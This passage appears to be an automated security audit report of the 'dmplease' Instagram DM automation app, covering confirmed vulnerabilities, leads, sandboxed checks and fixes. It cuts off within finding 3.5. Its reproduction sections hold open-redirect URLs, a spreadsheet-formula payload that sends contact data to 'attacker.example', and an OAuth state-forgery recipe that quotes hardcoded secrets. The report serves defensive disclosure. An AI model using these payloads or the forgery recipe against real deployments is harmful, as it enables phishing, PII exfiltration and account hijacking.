# dmplease — Full Security Audit

**Repository:** `dmplease` · **Commit:** `2486155efacb274c405f37f8a10dca4bf77d0883` · **Worktree:** clean

**Audit profile:** standard · **Run ID:** `dmplease-run-1` · **Completed:** 2026-11-27T16:05:03.076Z

**Execution model:** source review plus bounded local checks inside Docker (`--network none`, read-only target mount, scratch-only writes, CPU/memory/pid/wall-clock limits). No deployed endpoint, provider API, or shared service was contacted.

---

## 1. Executive summary

This audit reviewed the dmplease Instagram comment-to-DM automation platform at commit `2486155efacb274c405f37f8a10dca4bf77d0883`. It covered **45 deterministic coverage units** across three hunter waves, with a fresh coverage critic after each wave and a final-clean critic at the end. The final-clean critic returned `stop: true` with no accepted missing units.

The result is **8 confirmed vulnerabilities**, **14 source-grounded leads that need one external fact to resolve**, and **2 claims that were disproved during validation**.

The codebase has a genuinely strong baseline: the Meta webhook verifies HMAC over the exact raw body and fails closed; QStash signatures are bound to the request URL; cron and admin routes use length-checked constant-time comparison; Instagram tokens are stored with AES-256-GCM; tenant tables have RLS; and most creator APIs re-check workspace ownership. The confirmed issues are concentrated in redirect/navigation handling, a few service-role reads and writes that are not tenant-scoped, and two business-logic defects that cause unintended DM sends or a shared metrics-flush failure.

### Confirmed findings at a glance

| # | Severity | Finding | Primary location |
|---|---|---|---|
| 1 | medium | Open redirect in /auth/confirm via protocol-relative `next` parameter | `app/auth/confirm/route.ts:32` |
| 2 | medium | Contact CSV export emits attacker-controlled email as a live spreadsheet formula | `app/api/contacts/export/route.ts:148` |
| 3 | medium | Share-to-DM campaigns fire on comment events because the comment loop does not filter trigger_type | `lib/meta/webhook-processor.ts:2622` |
| 4 | medium | OAuth state HMAC accepts hardcoded, publicly-known secrets, allowing state forgery for any user id | `app/api/auth/meta/callback/route.ts:144` |
| 5 | medium | Diagnostics webhook health reads the global service-role ledger and renders other tenants' job errors | `app/dashboard/diagnostics/page.tsx:262` |
| 6 | medium | One manual DM writes a non-UUID metrics target that permanently breaks the shared daily-metrics flush | `supabase/migrations/20261126_daily_metrics.sql:50` |
| 7 | low | OAuth callback redirects to an unvalidated nextUrl from the state, giving an unauthenticated open redirect | `app/api/auth/meta/callback/route.ts:49` |
| 8 | low | Opt-out is dropped for first-time story senders because recordOptOut only updates an existing contact row | `lib/meta/webhook-processor.ts:381` |

### Leads that need validation at a glance

| # | Lead | Primary location |
|---|---|---|
| 1 | Admin DLQ access is granted on an unverified email string | `lib/dlq-ops.ts:26` |
| 2 | Instagram connect binds a client-supplied instagram_id to the caller's workspace without proving control of that account | `lib/meta/webhook-processor.ts:531` |
| 3 | Unvalidated `next` parameter reaches window.location.href in LoginForm, allowing javascript: navigation | `components/login-form.tsx:88` |
| 4 | Sign-up next parameter is used as a raw navigation target after account creation | `components/sign-up-form.tsx:120` |
| 5 | Hardcoded AES-256 vault key is unconditionally accepted when decrypting Instagram access tokens | `lib/meta/vault.ts:84` |
| 6 | Re-run stuck-item recovery uses the insert timestamp as the claim time and can re-queue work whose send already reached Meta | `lib/rerun-runner.ts:277` |
| 7 | getToken substitutes a process-wide INSTAGRAM_ACCESS_TOKEN for a tenant's missing or undecryptable token | `lib/meta/client.ts:899` |
| 8 | webhook_events retains full Meta payloads with contact PII and has no in-repo retention or tenant-cascade path | `supabase/migrations/20261125_tier0_hardening.sql:27` |
| 9 | Pending opt-in rows are dereferenced by id alone, letting one tenant release another tenant's campaign content and write into its workspace | `lib/meta/webhook-processor.ts:3122` |
| 10 | Cross-tenant Instagram profile read and overwrite via unscoped syncInstagramProfile() in GET /api/instagram/media | `app/api/instagram/media/route.ts:70` |
| 11 | QStash worker verification can fall back to public development signing keys | `app/api/workers/qstash/route.ts:42` |
| 12 | Cross-tenant campaign content disclosure via unbound pending_dms.automation_id | `lib/meta/webhook-processor.ts:2585` |
| 13 | Webhook dedupe fails open when Redis is unavailable, leaving only a non-atomic DB guard against duplicate DM sends | `lib/meta/webhook-processor.ts:2419` |
| 14 | One dedupe key is claimed for a whole multi-event webhook payload, so a retried batch drops unprocessed events | `app/api/webhook/route.ts:87` |

---

## 2. Scope, method, and limits

### What was reviewed

The whole repository at the stated commit: Next.js App Router pages and route handlers, server actions, the Meta webhook and QStash workers, cron and admin routes, the OAuth connect/callback flow, the Supabase/Prisma data layer and RLS migrations, the token vault, the public report and conversion-token surfaces, the short-link redirector, the R2 asset-signing path, and the client-side auth and dashboard components.

### How findings were produced

1. **Reconnaissance** mapped principals, trust boundaries, entry surfaces, and deployment-dependent controls.
2. **Coverage-led hunting** assigned deterministic units to isolated hunters; each hunter returned structured evidence, not prose.
3. **Candidate validation** gave every proposed finding to a fresh verifier that tried to refute it from source and bounded local evidence.
4. **Structured output** wrote every decision to `findings.json` and validated it against the report schema and the coverage ledger.
5. **Independent record verification** gave every retained record to a second fresh verifier that checked the trace, conditions, impact, severity, and fix.
6. **Reporting** derived this document from the final records.

### What this audit does not prove

This is a partial pass over the repository, not the deployed system. It does not prove the absence of vulnerabilities. Several controls depend on facts outside the repository and are recorded as blockers rather than assumed: whether the live Supabase project has the RLS migrations applied, whether Supabase Auth email confirmation and CAPTCHA are enabled, whether Vercel overwrites `x-forwarded-*` headers, whether the Meta app is in Live mode with the expected webhook subscriptions, and whether QStash/Redis/R2 are configured.

---

## 3. Confirmed findings

Each confirmed finding below was reproduced with a bounded local check and then independently re-verified. Severity is the overall severity; it never exceeds the demonstrated impact.

### 3.1 Open redirect in /auth/confirm via protocol-relative `next` parameter

**Severity:** medium · **Likelihood:** high · **Impact:** medium · **Confidence:** high

**Fingerprint:** `app/auth/confirm/route.ts:next-protocol-relative-redirect`

#### What it is

GET /auth/confirm (and /auth/callback, which re-exports the same handler) reads the `next` query parameter and redirects to it after a successful code exchange or OTP verification. The only validation is `next.startsWith('/')`, which accepts protocol-relative values such as `//evil.example`, `///evil.example` and `/\evil.example`. `new URL(destinationPath, origin)` therefore resolves to the attacker's origin, so a victim who completes a legitimate magic-link or OAuth sign-in is redirected off-site immediately after their Supabase session cookies are set on the same response. The value is attacker-supplied end to end: the login form embeds it in the magic-link `emailRedirectTo` and the OAuth `redirectTo`, so the link in the victim's inbox points at the real application and only the final hop leaves it.

#### Root cause

app/auth/confirm/route.ts line 22 treats any value beginning with '/' as a safe relative path and passes it to `new URL(destinationPath, origin)` at line 23. A leading '//' (or '/\', which the WHATWG URL parser normalizes to '//') is a network-path reference, so the URL constructor replaces the origin instead of appending a path. No allowlist of permitted redirect paths or origins exists on the route.

#### Intended behavior

The post-authentication redirect should only ever land on a path of the application's own origin. `next` should be rejected or rewritten unless it is a single-slash-rooted path with no second leading slash or backslash, and the redirect should be built from a fixed configured origin rather than a request-derived one.

#### Where it lives (source trace)

- **entrypoint** — `app/auth/confirm/route.ts:10` (GET /auth/confirm): `next` is read directly from the request query string with a default of '/onboarding'.
- **propagation** — `app/auth/confirm/route.ts:22` (GET /auth/confirm): `destinationPath = next.startsWith('/') ? next : '/' + next` is the only validation; '//evil.example' satisfies startsWith('/') and is passed through unchanged.
- **propagation** — `app/auth/confirm/route.ts:23` (GET /auth/confirm): `new URL(destinationPath, origin)` resolves a network-path reference against the origin, producing https://evil.example/.
- **sink** — `app/auth/confirm/route.ts:32` (GET /auth/confirm): `NextResponse.redirect(redirectUrl)` emits the off-origin Location header; the same response object carries the Supabase session cookies set at lines 45-53 and is returned at line 78 after a successful code exchange.

#### Who can trigger it

An unauthenticated attacker crafts a sign-in URL that carries a protocol-relative `next` value and delivers it to a victim, either directly or by having the victim request a magic link from the crafted login URL so the emailed link inherits the value.

#### Conditions required

- **user_interaction:** The victim must open a crafted /auth/confirm or /auth/callback URL, or click a magic-link / OAuth sign-in link whose `next` value was attacker-chosen, and complete the authentication step.
- **system_configuration:** No redirect allowlist or origin pinning is configured; the route derives `origin` from request headers and accepts any protocol-relative `next`.

#### What we observed

Bounded local node check (docker run --rm --network none --read-only --tmpfs /tmp:rw,size=64m --memory 512m --cpus 1 --pids-limit 128 --cap-drop ALL --security-opt no-new-privileges, target mounted read-only) reproduced the route's exact expressions: '/dashboard' resolved to https://app.example.com/dashboard; '//evil.example' resolved to https://evil.example/; '/\evil.example' resolved to https://evil.example/; '///evil.example' resolved to https://evil.example/; 'javascript:alert(document.domain)' resolved to https://app.example.com/javascript:alert(document.domain). Three of the five tested `next` values leave the application origin. Raw output: agents/v04/artifacts/check-output.json.

#### Why it matters

The victim lands on an attacker-controlled site immediately after authenticating, enabling credential phishing. No data is disclosed directly by the redirect itself.

Likelihood rationale: Crafting the URL requires no authentication and no special tooling; the value survives the only check and is also carried into legitimate magic-link and OAuth emails.

#### Evidence

- `app/auth/confirm/route.ts:22` — The sole redirect validation is a leading-slash test, which does not distinguish a rooted path from a protocol-relative URL.
- `app/auth/confirm/route.ts:23` — URL resolution against `origin` is what turns '//evil.example' into an absolute off-origin URL.
- `components/login-form.tsx:148` — The magic-link `emailRedirectTo` embeds the attacker-controlled callbackUrl as `next`, so the delivered email link points at the real app and the redirect happens after the click.
- `app/auth/callback/route.ts:1` — `export { GET } from '../confirm/route'` means the OAuth callback path shares the identical redirect logic.

#### How to fix it

Replace the leading-slash test with a strict same-origin path check and build the redirect from a fixed configured origin. Reject any value whose second character is '/' or '\', any value containing a scheme, and any value that does not resolve to the configured origin.

`app/auth/confirm/route.ts`:

```ts
const configuredOrigin =
  process.env.NEXT_PUBLIC_SITE_URL?.replace(/\/$/, "") ||
  `${isHttps ? "https" : "http"}://${host}`;

function safeNextPath(raw: string | null): string {
  if (!raw) return "/onboarding";
  if (!raw.startsWith("/") || raw.startsWith("//") || raw.includes("\\")) {
    return "/onboarding";
  }
  const resolved = new URL(raw, configuredOrigin);
  if (resolved.origin !== configuredOrigin) return "/onboarding";
  return resolved.pathname + resolved.search + resolved.hash;
}

const destinationPath = safeNextPath(next);
const redirectUrl = new URL(destinationPath, configuredOrigin);
```

#### Reproduction inputs

- `/auth/confirm?next=//evil.example`
- `/auth/confirm?next=/\evil.example`
- `/auth/confirm?next=///evil.example`
- `/auth/login?next=//evil.example`

Instructions:
1. Run the URL-resolution logic from app/auth/confirm/route.ts lines 22-23 in an isolated node process with origin fixed to https://app.example.com and no network access.
2. Feed each payload's `next` value through `destinationPath = next.startsWith('/') ? next : '/' + next` and then `new URL(destinationPath, origin).href`.
3. Compare the resolved origin with the fixed app origin and record which inputs leave it.

---

### 3.2 Contact CSV export emits attacker-controlled email as a live spreadsheet formula

**Severity:** medium · **Likelihood:** medium · **Impact:** medium · **Confidence:** high

**Fingerprint:** `csv-injection:app/api/contacts/export:csvCell`

#### What it is

GET /api/contacts/export renders contact fields into CSV with csvCell, which only quotes values and doubles embedded quotes. A contact can set their email through a lead-capture campaign to a value that passes EMAIL_RE but begins with '=', such as =HYPERLINK("https://attacker.example/?d="&A1,"click@x.co"). When the workspace owner exports contacts and opens the file in Excel, Google Sheets, or LibreOffice, the cell is evaluated as a formula, allowing exfiltration of the exported contact PII to an attacker-controlled URL (and, on DDE-enabled clients, command execution).

#### Root cause

csvCell does not neutralize spreadsheet formula prefixes, and the email lead-capture validator accepts a formula-shaped local part, so attacker-controlled contact data reaches the export artifact as an executable cell.

#### Intended behavior

Exported contact values should be treated as inert text: any value beginning with =, +, -, @, tab, or CR should be prefixed so the spreadsheet does not evaluate it, and the export should remain a faithful representation of the stored data.

#### Where it lives (source trace)

- **entrypoint** — `app/api/webhook/route.ts:53` (POST /api/webhook): An anonymous Instagram user's DM reply arrives as a signed Meta webhook.
- **propagation** — `lib/meta/webhook-processor.ts:3449` (validateLeadValue): The reply text is validated as an email.
- **propagation** — `lib/lead-capture.ts:36` (EMAIL_RE): The regex accepts the formula-shaped value because it only forbids '@' and whitespace.
- **propagation** — `lib/meta/webhook-processor.ts:994` (saveContactField): The validated reply is stored verbatim in contacts.email.
- **propagation** — `app/api/contacts/export/route.ts:46` (GET /api/contacts/export): The authenticated workspace owner requests the contacts export.
- **propagation** — `app/api/contacts/export/route.ts:132` (CSV row mapping): row.email is placed in the exported row.
- **propagation** — `app/api/contacts/export/route.ts:39` (csvCell): csvCell quotes the value and doubles quotes but leaves a leading '=' intact.
- **sink** — `app/api/contacts/export/route.ts:148` (CSV response): The CSV is returned to the creator, who opens it in a spreadsheet that evaluates the formula.

#### Who can trigger it

An anonymous Instagram user replies to a collect-email prompt with a formula-shaped value that passes EMAIL_RE; the workspace owner later exports contacts and opens the CSV.

#### Conditions required

- **authentication_level:** The exporter must be an authenticated workspace owner (GET /api/contacts/export).
- **user_interaction:** The creator must export contacts and open the CSV in a spreadsheet that evaluates formulas.
- **third_party_dependency:** The spreadsheet application evaluates cells beginning with '=' as formulas.
- **data_state:** A contact must have an email captured through a lead-capture campaign whose value passes EMAIL_RE and begins with '='.

#### What we observed

{"input":"=HYPERLINK(\"https://attacker.example/?d=\"&A1,\"click@x.co\")","normalized":"=hyperlink(\"https://attacker.example/?d=\"&a1,\"click@x.co\")","emailAcceptedByLeadValidation":true,"emittedCell":"\"=hyperlink(\"\"https://attacker.example/?d=\"\"&a1,\"\"click@x.co\"\")\"","parsedCellValue":"=hyperlink(\"https://attacker.example/?d=\"&a1,\"click@x.co\")","cellValueStartsWithFormulaChar":true}

#### Why it matters

Formula execution can exfiltrate the exported contact PII to an attacker URL and, on DDE-enabled clients, run commands on the creator's machine.

Likelihood rationale: A creator must export and open the CSV in a formula-evaluating app, but the malicious value is captured through a normal lead-capture reply and the export is a first-class UI action.

#### Evidence

- `app/api/contacts/export/route.ts:43` — csvCell returns `"${raw.replace(/"/g, '""')}"` with no formula-prefix neutralization.
- `lib/lead-capture.ts:36` — EMAIL_RE = /^[^@\s]+@[^@\s]+\.[^@\s]{2,}$/ accepts =HYPERLINK("https://attacker.example/?d="&A1,"click@x.co").
- `lib/meta/webhook-processor.ts:994` — saveContactField writes the validated email value directly to contacts.email.
- `app/api/contacts/export/route.ts:132` — row.email is included in the exported CSV row.

#### How to fix it

Neutralize spreadsheet formula prefixes in csvCell and add a regression test with a formula-shaped email.

`app/api/contacts/export/route.ts`:

```ts
function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";
  const raw =
    typeof value === "object" ? JSON.stringify(value) : String(value);
  // Neutralize spreadsheet formula prefixes (CSV injection).
  const safe = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw;
  return `"${safe.replace(/"/g, '""')}"`;
}
```

#### Reproduction inputs

- `=HYPERLINK("https://attacker.example/?d="&A1,"click@x.co")`

Instructions:
1. Run the bounded local check in the sandbox: docker run --rm --network none --read-only --tmpfs /tmp:rw,size=64m --memory 512m --cpus 1 --pids-limit 128 --cap-drop ALL --security-opt no-new-privileges -v "<target>:/target:ro" -v "<scratch>:/scratch:rw" --entrypoint node penpotapp/mcp:2.17 /scratch/check-csv.mjs
2. The harness extracts the csvCell body verbatim from app/api/contacts/export/route.ts and the EMAIL_RE literal from lib/lead-capture.ts, then renders the malicious email as a CSV cell.

---

### 3.3 Share-to-DM campaigns fire on comment events because the comment loop does not filter trigger_type

**Severity:** medium · **Likelihood:** medium · **Impact:** medium · **Confidence:** high

**Fingerprint:** `dmplease:webhook:share-to-dm-automation-fires-on-comment-events`

#### What it is

The comment branch of processWebhookPayload loads every active automation for the workspace and runs each through processCommentEventForAutomation, which never inspects triggerType. SHARE_TO_DM campaigns created through the campaign builder are persisted with an empty trigger_keywords array, and findMatchingKeyword treats an empty list as AUTO_MATCH, so a share thank-you campaign sends its DM as a private reply to every commenter on the creator's posts (subject to the normal opt-out, cooldown, and 30-day reply-once guards). Because the send also marks the 30-day reply-once key, the share campaign can consume the slot and suppress the intended COMMENT campaign for that commenter and post.

#### Root cause

The comment automation selection filters only on workspace_id and active, and processCommentEventForAutomation has no trigger_type guard, so a SHARE_TO_DM automation with empty trigger_keywords matches every comment through findMatchingKeyword's AUTO_MATCH fallback.

#### Intended behavior

A SHARE_TO_DM campaign should fire only when a follower shares a post into the creator's DM; comment events should be evaluated only against COMMENT campaigns.

#### Where it lives (source trace)

- **entrypoint** — `app/api/webhook/route.ts:53` (POST): Meta's signed webhook is verified and handed to processWebhookPayload.
- **propagation** — `lib/meta/webhook-processor.ts:3186` (processWebhookPayload): The comment events loop begins for each parsed comment.
- **propagation** — `lib/meta/webhook-processor.ts:3230` (processWebhookPayload): Every active automation for the workspace is selected with no trigger_type predicate.
- **propagation** — `lib/meta/webhook-processor.ts:3247` (processWebhookPayload): Each automation, including SHARE_TO_DM campaigns, is passed to processCommentEventForAutomation.
- **propagation** — `lib/meta/webhook-processor.ts:2545` (processCommentEventForAutomation): findMatchingKeyword with an empty keyword list returns AUTO_MATCH, so the comment is treated as a match.
- **propagation** — `app/dashboard/campaigns/actions.ts:132` (createCampaign): SHARE_TO_DM campaigns are persisted with trigger_keywords = [].
- **sink** — `lib/meta/webhook-processor.ts:2622` (processCommentEventForAutomation): sendCommentDm sends the share campaign's DM as a private reply to the commenter.

#### Who can trigger it

Any Instagram user who can comment on the creator's public post. No dmplease account or special privilege is required; the comment is delivered to dmplease through Meta's signed webhook.

#### Conditions required

- **authentication_level:** Anonymous Instagram user; no dmplease account is needed. The comment arrives through Meta's signed webhook, so the trigger is an ordinary public comment.
- **user_interaction:** The creator must have an active SHARE_TO_DM campaign (created through the campaign builder, which persists trigger_keywords = []) and a user must comment on the connected account's post.
- **system_configuration:** DATABASE_URL must be configured (hasAdminDb() true) and the Instagram account must have a usable access token so the send path runs.
- **data_state:** The workspace has at least one active automation with trigger_type = 'SHARE_TO_DM' and trigger_keywords = []; the commenter is not opted out, is outside the 10-minute per-post cooldown, and has not received a DM for that post in the last 30 days.
- **timing_dependency:** The share automation must be processed before the intended COMMENT automation for the same comment to consume the 30-day reply-once slot; the automation query has no ORDER BY, so this is order-dependent.
- **third_party_dependency:** Meta must deliver the comment change to the webhook endpoint and the signature must validate against META_APP_SECRET.

#### What we observed

In a bounded local harness (real lib/meta/webhook-processor.ts; external services and the webhook parser stubbed to emit one comment event), one active SHARE_TO_DM automation with trigger_keywords [] plus one comment event produced exactly one sendPrivateReply call with text 'Thanks for sharing!' for comment c-1, one markReplied call, and result.sent = 1. The harness output is retained at agents/v21/artifacts/check-output.json.

#### Why it matters

The creator's account sends unsolicited DMs to commenters, risking Meta messaging-policy enforcement or account restriction and brand damage, and the share campaign can consume the 30-day reply-once slot and suppress the intended comment campaign. No cross-tenant data exposure or privilege escalation.

Likelihood rationale: Requires the creator to have an active SHARE_TO_DM campaign (a normal, first-class configuration) and comment traffic on the connected account; once both exist, every comment triggers the path automatically.

#### Evidence

- `lib/meta/webhook-processor.ts:3230` — The comment loop filters only on workspace_id and active; trigger_type is not constrained.
- `lib/meta/webhook-processor.ts:2532` — processCommentEventForAutomation never inspects auto.triggerType.
- `lib/meta/webhook-processor.ts:454` — findMatchingKeyword returns AUTO_MATCH for an empty keyword list.
- `app/dashboard/campaigns/actions.ts:132` — SHARE_TO_DM campaigns are persisted with trigger_keywords = [].
- `lib/meta/webhook-processor.ts:4069` — The share path does filter trigger_type = SHARE_TO_DM, showing the intended separation between event families.

#### How to fix it

Constrain the comment automation query to trigger_type = 'COMMENT' and add a defense-in-depth triggerType guard in processCommentEventForAutomation so a SHARE_TO_DM automation can never be dispatched from a comment event. Keep the share path's existing trigger_type = 'SHARE_TO_DM' filter.

`lib/meta/webhook-processor.ts`:

```ts
const { data: automationRows } = await getAdminDb()
  .from("automations")
  .select("*")
  .eq("workspace_id", account.workspace_id)
  .eq("trigger_type", "COMMENT")
  .eq("active", true);
```

`lib/meta/webhook-processor.ts`:

```ts
export async function processCommentEventForAutomation(
  event: WebhookCommentEvent,
  auto: AutomationLike,
  attempts = 0
): Promise<{ sent: boolean; skipped?: string; error?: MetaApiError }> {
  if (auto.triggerType === "SHARE_TO_DM") {
    return { sent: false, skipped: "Share campaign is not a comment automation" };
  }
  if (!hasAdminDb()) return { sent: false, skipped: "Database unavailable" };
  // ... existing body unchanged
```

#### Reproduction inputs

- `Meta comment webhook (signed with X-Hub-Signature-256) whose parsed comment event is {instagramAccountId:'ig-1', commentId:'c-1', commenterId:'u-1', commenterName:'someone', commentText:'nice post', mediaId:'m-1', parentCommentId:null}`
- `Workspace automation row: {trigger_type:'SHARE_TO_DM', trigger_keywords:[], post_scope:'ANY_POST', dm_message:'Thanks for sharing!', active:true}`

Instructions:
1. Create a SHARE_TO_DM campaign in the dashboard (the builder defaults post_scope to ANY_POST and createCampaign persists trigger_keywords = []).
2. From a second Instagram account, comment any text on a post or reel of the connected account.
3. Meta delivers the comment webhook to POST /api/webhook; the signature check passes and processWebhookPayload runs.
4. The comment loop selects the SHARE_TO_DM automation, findMatchingKeyword returns AUTO_MATCH, and sendCommentDm sends the share campaign's dm_message as a private reply to the commenter.

---

### 3.4 OAuth state HMAC accepts hardcoded, publicly-known secrets, allowing state forgery for any user id

**Severity:** medium · **Likelihood:** high · **Impact:** medium · **Confidence:** high

**Fingerprint:** `lib/meta/client.ts:oauth-state-hardcoded-hmac-secret`

#### What it is

verifyOAuthState() accepts a state signature produced with any key returned by getOAuthStateSecrets(). That list always contains two string literals committed to the repository: LEGACY_VAULT_SECRET (a 64-hex constant in lib/config.ts) and DEV_ONLY_SECRET ('dmplease-local-development-only-change-me'). The list is built without a NODE_ENV guard, so a production deployment that has configured a private OAUTH_STATE_SECRET still accepts states signed with either public constant. Anyone who can read the repository can therefore mint a valid state for an arbitrary userId, nextUrl and provider. The callback treats that state as the authorization subject: it takes userId from the verified payload and never compares it to the authenticated session. The write runs through the cookie-bound Supabase client, so RLS still requires the request's session to match the state-supplied user id; the practical effect is an OAuth link-CSRF (a victim who loads the callback URL while logged in links an attacker-controlled Instagram account and has profile fields overwritten), not an unauthenticated cross-tenant write.

#### Root cause

lib/config.ts getOAuthStateSecrets() (lines 116-122) builds the accepted-key list as [current, ...new Set([process.env.TOKEN_VAULT_SECRET, LEGACY_VAULT_SECRET, DEV_ONLY_SECRET])] with no environment check, so two constants that are public in source are always valid HMAC keys. lib/meta/client.ts verifyOAuthState() (lines 121-124) accepts a signature that matches any of them, and app/api/auth/meta/callback/route.ts line 68 takes userId from the verified payload instead of from the session.

#### Intended behavior

OAuth state integrity should depend only on secrets supplied by the deployment environment. A state signed with a value that appears in the source tree must be rejected, and the callback should additionally require that the state subject equals the authenticated session user before writing.

#### Where it lives (source trace)

- **entrypoint** — `app/api/auth/meta/callback/route.ts:37` (GET /api/auth/meta/callback): Anonymous GET handler (proxy.ts excludes /api from the session gate) verifies the state parameter and proceeds; it never calls getCurrentUser().
- **propagation** — `lib/meta/client.ts:121` (verifyOAuthState): getOAuthStateSecrets().some(...) accepts a signature produced with any key in that list, including the two public constants.
- **propagation** — `lib/config.ts:118` (getOAuthStateSecrets): The extras array unconditionally includes LEGACY_VAULT_SECRET and DEV_ONLY_SECRET; there is no NODE_ENV or production guard.
- **propagation** — `lib/config.ts:12` (LEGACY_VAULT_SECRET): Hardcoded 64-hex constant committed to the repository; line 9 defines DEV_ONLY_SECRET as a second literal.
- **propagation** — `app/api/auth/meta/callback/route.ts:68` (GET /api/auth/meta/callback): userId = verifiedState.userId with no comparison to the authenticated session.
- **sink** — `app/api/auth/meta/callback/route.ts:144` (GET /api/auth/meta/callback): pending_connections.insert({ user_id: userId, access_token: encryptToken(longLivedToken), accounts }) writes the OAuth result under the state-supplied user id; line 126 performs the matching profiles update.

#### Who can trigger it

An unauthenticated attacker builds a state payload for a chosen userId, signs it with the public LEGACY_VAULT_SECRET (or DEV_ONLY_SECRET), and presents it to /api/auth/meta/callback together with an authorization code for an Instagram account they control.

#### Conditions required

- **authentication_level:** Forging a state requires no account and no interaction with the target; the callback itself performs no session check and proxy.ts excludes /api from the session gate.
- **user_interaction:** Cross-user writes additionally require the target's browser to load the callback URL while holding a session (SameSite=Lax permits the session cookie on a top-level GET navigation) so that auth.uid() equals the forged userId; the RLS policies on profiles and pending_connections deny the write otherwise.
- **system_configuration:** A production deployment with OAUTH_STATE_SECRET (or TOKEN_VAULT_SECRET) configured still accepts the two hardcoded constants.
- **data_state:** The attacker must know the victim's Supabase user UUID so the forged state subject equals auth.uid() for the RLS check.
- **timing_dependency:** The attacker must supply a valid single-use Meta authorization code for an account they control and get the victim to load the callback before the code expires.

#### What we observed

Docker (--network none --read-only --tmpfs /tmp:rw,size=64m --memory 512m --cpus 1 --pids-limit 128 --cap-drop ALL --security-opt no-new-privileges, target mounted read-only): accepted_secret_count=3; legacy_constant_is_in_accepted_set=true; dev_constant_is_in_accepted_set=true; forged_with_legacy_constant={userId:'victim-user-id',nextUrl:'/dashboard/settings',provider:'facebook'}; forged_with_dev_constant={userId:'victim-user-id',nextUrl:'/dashboard/settings',provider:'facebook'}; control_random_secret=null; control_real_secret verified normally. Output: agents/v07/artifacts/check-output.json.

#### Why it matters

The state is the only authorization binding on the OAuth callback. A forged state lets an attacker choose the write subject for profiles and pending_connections; the cookie-bound client and RLS still require the victim's session, so the practical effect is account-linking CSRF and profile-field overwrite rather than a direct cross-tenant read.

Likelihood rationale: The signing keys are literals in the repository, so minting a state for any user id is a single HMAC call; the callback is anonymously reachable and performs no session comparison. The end-to-end link-CSRF additionally needs the victim's UUID, a valid single-use Meta code, and the victim loading the URL while logged in.

#### Evidence

- `lib/config.ts:118` — The extras array unconditionally includes LEGACY_VAULT_SECRET and DEV_ONLY_SECRET; there is no NODE_ENV or production guard.
- `lib/config.ts:12` — LEGACY_VAULT_SECRET is a literal in source, so it is public to anyone with the repository.
- `lib/meta/client.ts:121` — Verification iterates every accepted secret and returns true on the first match.
- `app/api/auth/meta/callback/route.ts:68` — userId is taken from the state payload, not from the authenticated session.
- `app/api/auth/meta/callback/route.ts:144` — The state-supplied user id is the write subject for the pending connection row.

#### How to fix it

Remove the hardcoded constants from the verification key list and accept only environment-supplied secrets, requiring a dedicated OAUTH_STATE_SECRET in production. Bind the state to the initiating session so a valid state alone is not sufficient authorization.

`lib/config.ts`:

```ts
export function getOAuthStateSecrets(): string[] {
  const current = getOAuthStateSecret();
  const previous = process.env.OAUTH_STATE_SECRET_PREVIOUS?.trim();
  return previous && previous !== current ? [current, previous] : [current];
}
```

`app/api/auth/meta/callback/route.ts`:

```ts
const sessionUser = await getCurrentUser();
if (!verifiedState || !verifiedState.userId || sessionUser?.id !== verifiedState.userId) {
  targetUrl.searchParams.set("error", "The connection link expired. Please try again.");
  return NextResponse.redirect(targetUrl);
}
```

#### Reproduction inputs

- `payload = base64url(JSON.stringify({userId:'<target-uuid>',nextUrl:'/dashboard/settings',provider:'facebook',expiresAt:Date.now()+600000,nonce:'x'})); state = payload + '.' + hmac_sha256_hex(payload, 'a8b3e9447c231791a826477bfa9c338290eef219a5c814df39c4a8563a45c291')`
- `state = payload + '.' + hmac_sha256_hex(payload, 'dmplease-local-development-only-change-me')`

Instructions:
1. Run the target's own lib/meta/client.ts and lib/config.ts in an isolated node process with NODE_ENV=production, OAUTH_STATE_SECRET set to a private 64-hex value, and TOKEN_VAULT_SECRET unset.
2. Forge a state for userId 'victim-user-id' with each hardcoded constant and pass it to verifyOAuthState().
3. Compare against a control state signed with an unrelated secret and against a state produced by signOAuthState().

---

### 3.5 Diagnostics webhook health reads the global service-role ledger and renders other tenants' job errors

**Severity:** medium · **Likelihood:** high · **Impact:** medium · **Confidence:** high

**Fingerprint:** `lib/meta/webhook-events.ts:getWebhookHealth:unscoped-service-role-read`

#### What it is

Any authenticated creator can open /dashboard/diagnostics and read webhook health computed over every tenant's webhook_events rows. The page renders the platform-wide failed count, success rate and average duration, and prints up to two recent failure strings that contain other tenants' automation names, comment ids and Meta message ids. The same global aggregate is shown on /dashboard and /dashboard/overview.

#### Root cause

getWebhookHealth() takes only an hours window and queries webhook_events through the service-role client with no workspace or instagram-account predicate, then returns recentFailures[].error to a page that has no admin gate.

#### Intended behavior

A creator-facing diagnostics screen must aggregate only the caller's own workspaces (as getQueueStats already does), or the delivery card must be restricted to platform admins identified by ADMIN_ALERT_EMAILS.

#### Where it lives (source trace)

- **entrypoint** — `app/dashboard/diagnostics/page.tsx:92` (DiagnosticsContent): The signed-in creator's diagnostics page calls getWebhookHealth(24 * 7) alongside the profile and Meta latency probe.
- **propagation** — `lib/meta/webhook-events.ts:113` (getWebhookHealth): The service-role client selects id, status, duration_ms, error and received_at from webhook_events filtered only by received_at >= since; no tenant column is selected or filtered.
- **propagation** — `lib/meta/webhook-events.ts:136` (getWebhookHealth): recentFailures is built from every FAILED row in the window, sorted by received_at and sliced to three, regardless of which tenant owns the row.
- **sink** — `app/dashboard/diagnostics/page.tsx:262` (DiagnosticsContent): The delivery check hint interpolates webhookHealth.failed and up to two recentFailures[].error strings into the rendered page.

#### Who can trigger it

An ordinary creator opens /dashboard/diagnostics and reads the delivery card, learning platform-wide webhook volume and other tenants' automation names, comment ids and Meta message ids.

#### Conditions required

- **authentication_level:** Any authenticated creator with a Supabase session, including one with no workspaces, can load /dashboard/diagnostics.
- **system_configuration:** NEXT_PUBLIC_SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY are configured so hasAdminDb() returns true; otherwise the page shows EMPTY_HEALTH.
- **data_state:** At least one FAILED webhook_events row exists in the last 7 days, owned by any tenant.

#### What we observed

{"total":3,"done":1,"failed":2,"pending":0,"successRate":33,"avgDurationMs":83,"recentFailures":[{"id":"tenant-b-job","error":"Inbound DM m_AG123 failed: Meta error 613: rate limit","receivedAt":"2026-11-26T11:00:00.000Z"},{"id":"tenant-a-job","error":"Comment 17890000000000001 on automation \"VIP Black Friday drop\": Meta error 190: invalid OAuth access token","receivedAt":"2026-11-26T10:00:00.000Z"}],"available":true} — the function returned both tenants' rows and their error strings, and the diagnostics page renders exactly these fields. Bounded run output retained at agents/v22/artifacts/check-output.json (682 bytes).

#### Why it matters

